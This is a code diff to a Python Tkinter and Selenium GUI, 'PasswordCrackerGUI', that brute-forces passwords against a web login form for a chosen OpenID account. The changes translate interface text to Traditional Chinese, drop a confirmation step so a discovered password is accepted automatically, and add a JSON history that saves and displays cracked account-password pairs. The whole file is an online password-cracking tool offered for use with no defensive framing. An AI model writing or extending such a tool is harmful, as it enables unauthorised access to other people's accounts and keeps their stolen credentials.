@@ -7,6 +7,9 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+import json
+from datetime import datetime
+import os
 
 BIG_EN = [
     "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
@@ -131,12 +134,12 @@ class PasswordCrackerGUI:
         ttk.Label(self.progress_frame, textvariable=self.current_password_var).grid(
             row=1, column=1, sticky=tk.W)
         
-        ttk.Label(self.progress_frame, text="总尝试次数:").grid(row=2, column=0, sticky=tk.W)
+        ttk.Label(self.progress_frame, text="總嘗試次數:").grid(row=2, column=0, sticky=tk.W)
         self.total_attempts_var = tk.StringVar(value="0")
         ttk.Label(self.progress_frame, textvariable=self.total_attempts_var).grid(
             row=2, column=1, sticky=tk.W)
         
-        ttk.Label(self.progress_frame, text="每秒尝试次数:").grid(row=3, column=0, sticky=tk.W)
+        ttk.Label(self.progress_frame, text="每秒嘗試次數:").grid(row=3, column=0, sticky=tk.W)
         self.attempts_per_sec_var = tk.StringVar(value="0")
         ttk.Label(self.progress_frame, textvariable=self.attempts_per_sec_var).grid(
             row=3, column=1, sticky=tk.W)
@@ -170,6 +173,20 @@ class PasswordCrackerGUI:
         self.exit_button.grid(row=0, column=2, padx=5)
         
         self.running = False
+        
+        # 修改歷史記錄控制項
+        self.check_history_var = tk.BooleanVar(value=True)
+        ttk.Checkbutton(self.main_frame, text="執行前檢查歷史", 
+                       variable=self.check_history_var).grid(
+            row=3, column=2, sticky=tk.W, pady=5)
+        
+        # 添加歷史記錄按鈕
+        self.history_button = ttk.Button(self.button_frame, text="查看歷史", 
+                                       command=self.show_history)
+        self.history_button.grid(row=0, column=3, padx=5)
+        
+        self.history_file = "password_history.json"
+        self.load_history()
 
     def toggle_ignore_digits(self):
         if self.ignore_var.get():
@@ -195,12 +212,12 @@ class PasswordCrackerGUI:
         return driver
 
     def verify_login_available(self, driver):
-        """检查登录页面是否可用"""
+        """檢查登入頁面是否可用"""
         try:
             login = driver.find_element(By.ID, "idf")
             return True
         except Exception:
-            return False  # 不直接显示错误，让调用者处理
+            return False  # 不直接顯示錯誤，讓呼叫者處理
 
     def collect_last_passwords(self):
         """收集所有线程最后尝试的密码"""
@@ -211,7 +228,7 @@ class PasswordCrackerGUI:
         return last_passwords
 
     def verify_passwords_sequence(self, passwords):
-        """单线程逐一验证密码"""
+        """單執行緒逐一驗證密碼"""
         driver = self.create_browser()
         try:
             for password in passwords:
@@ -219,11 +236,11 @@ class PasswordCrackerGUI:
                     break
                     
                 if not self.verify_login_available(driver):
-                    messagebox.showinfo("成功", f"密码可能是：{password}\n(顺序验证时发现)")
+                    messagebox.showinfo("成功", f"密碼可能是：{password}\n(順序驗證時發現)")
                     return password
                     
                 self.try_password(password, driver)
-                sl(0.1)  # 稍微延迟确保页面反应
+                sl(0.1)  # 稍微延遲確保頁面反應
                 
         finally:
             driver.quit()
@@ -335,7 +352,7 @@ class PasswordCrackerGUI:
                     EC.element_to_be_clickable((By.ID, "idf"))
                 ).click()
             except:
-                self.update_status(f"正在验证密码: {password}")
+                self.update_status(f"正在驗證密碼: {password}")
                 return True  # 按钮不可点击可能意味着已登录
             
             sl(0.5)  # 等待页面响应
@@ -343,13 +360,11 @@ class PasswordCrackerGUI:
             # 检查登录结果
             try:
                 driver.find_element(By.ID, "idf")
-                return False  # 仍能找到登录按钮，说明登录失败
+                return False
             except:
                 self.update_status(f"找到可能的密碼: {password}")
-                if messagebox.askyesno("確認", f"密碼可能是: {password}\n是否確認並退出？"):
-                    self.password_found(password)
-                    return True
-                return False
+                self.password_found(password)  # 自動處理密碼發現
+                return True
                 
         except Exception as e:
             print(f"嘗試密碼 {password} 時出錯: {str(e)}")
@@ -359,8 +374,22 @@ class PasswordCrackerGUI:
     def start_cracking(self):
         """修改启动方法，添加初始检查"""
         if not self.openid_var.get():
-            messagebox.showerror("错误", "请输入OpenID账号")
+            messagebox.showerror("錯誤", "請輸入OpenID帳號")
             return
+        
+        # 檢查是否需要先查詢歷史
+        if self.check_history_var.get():
+            openid = self.openid_var.get()
+            if openid in self.history:
+                history_records = self.history[openid]
+                if history_records:
+                    last_record = history_records[-1]
+                    if messagebox.askyesno("發現歷史記錄", 
+                        f"該帳號最後一次破解密碼是：{last_record['password']}\n" +
+                        f"時間：{last_record['time']}\n\n是否繼續破解？"):
+                        pass
+                    else:
+                        return
         
         try:
             self.thread_count = int(self.thread_var.get())
@@ -529,10 +558,72 @@ class PasswordCrackerGUI:
         self.root.destroy()
 
     def password_found(self, password):
-        """处理找到密码的情况"""
+        """處理找到密碼的情況"""
         messagebox.showinfo("成功", f"密碼破解成功！密碼是：{password}")
+        self.save_history(self.openid_var.get(), password)
+        self.stop_cracking()  # 自動停止所有線程
+        
         if messagebox.askyesno("確認", "是否退出程序？"):
             self.exit_app()
+
+    def load_history(self):
+        """載入歷史紀錄"""
+        if os.path.exists(self.history_file):
+            try:
+                with open(self.history_file, 'r', encoding='utf-8') as f:
+                    self.history = json.load(f)
+            except:
+                self.history = {}
+        else:
+            self.history = {}
+
+    def save_history(self, openid, password):
+        """儲存歷史紀錄"""
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        if openid not in self.history:
+            self.history[openid] = []
+        
+        self.history[openid].append({
+            "password": password,
+            "time": current_time
+        })
+        
+        try:
+            with open(self.history_file, 'w', encoding='utf-8') as f:
+                json.dump(self.history, f, ensure_ascii=False, indent=2)
+        except Exception as e:
+            messagebox.showerror("錯誤", f"儲存歷史紀錄失敗：{str(e)}")
+
+    def show_history(self):
+        """顯示所有歷史紀錄"""
+        history_window = tk.Toplevel(self.root)
+        history_window.title("密碼破解歷史紀錄")
+        history_window.geometry("500x400")
+        
+        # 建立樹狀檢視
+        tree = ttk.Treeview(history_window, columns=('account', 'password', 'time'), 
+                            show='headings')
+        tree.heading('account', text='OpenID帳號')
+        tree.heading('password', text='密碼')
+        tree.heading('time', text='時間')
+        
+        # 設定欄位寬度
+        tree.column('account', width=150)
+        tree.column('password', width=150)
+        tree.column('time', width=150)
+        
+        # 加入捲軸
+        scrollbar = ttk.Scrollbar(history_window, orient="vertical", command=tree.yview)
+        tree.configure(yscrollcommand=scrollbar.set)
+        
+        # 填入所有歷史記錄
+        for account in self.history:
+            for record in self.history[account]:
+                tree.insert('', 'end', values=(account, record['password'], record['time']))
+        
+        # 排版
+        tree.pack(side="left", fill="both", expand=True)
+        scrollbar.pack(side="right", fill="y")
 
 def main():
     root = tk.Tk()
